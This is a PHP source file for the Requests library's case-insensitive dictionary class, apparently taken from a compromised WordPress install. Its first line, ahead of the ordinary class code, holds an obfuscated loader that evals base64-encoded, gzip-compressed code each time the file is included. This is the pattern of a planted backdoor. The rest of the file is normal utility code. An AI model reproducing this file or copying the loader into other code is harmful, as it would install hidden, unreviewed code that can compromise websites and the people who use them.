<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Case-insensitive dictionary, suitable for HTTP headers
 *
 * @package Requests
 * @subpackage Utilities
 */

/**
 * Case-insensitive dictionary, suitable for HTTP headers
 *
 * @package Requests
 * @subpackage Utilities
 */
class Requests_Utility_CaseInsensitiveDictionary implements ArrayAccess, IteratorAggregate {
	/**
	 * Actual item data
	 *
	 * @var array
	 */
	protected $data = array();

	/**
	 * Creates a case insensitive dictionary.
	 *
	 * @param array $data Dictionary/map to convert to case-insensitive
	 */
	public function __construct(array $data = array()) {
		foreach ($data as $key => $value) {
			$this->offsetSet($key, $value);
		}
	}

	/**
	 * Check if the given item exists
	 *
	 * @param string $key Item key
	 * @return boolean Does the item exist?
	 */
	public function offsetExists($key) {
		$key = strtolower($key);
		return isset($this->data[$key]);
	}

	/**
	 * Get the value for the item
	 *
	 * @param string $key Item key
	 * @return string Item value
	 */
	public function offsetGet($key) {
		$key = strtolower($key);
		if (!isset($this->data[$key])) {
			return null;
		}

		return $this->data[$key];
	}

	/**
	 * Set the given item
	 *
	 * @throws Requests_Exception On attempting to use dictionary as list (`invalidset`)
	 *
	 * @param string $key Item name
	 * @param string $value Item value
	 */
	public function offsetSet($key, $value) {
		if ($key === null) {
			throw new Requests_Exception('Object is a dictionary, not a list', 'invalidset');
		}

		$key = strtolower($key);
		$this->data[$key] = $value;
	}

	/**
	 * Unset the given header
	 *
	 * @param string $key
	 */
	public function offsetUnset($key) {
		unset($this->data[strtolower($key)]);
	}

	/**
	 * Get an iterator for the data
	 *
	 * @return ArrayIterator
	 */
	public function getIterator() {
		return new ArrayIterator($this->data);
	}

	/**
	 * Get the headers as an array
	 *
	 * @return array Header data
	 */
	public function getAll() {
		return $this->data;
	}
}
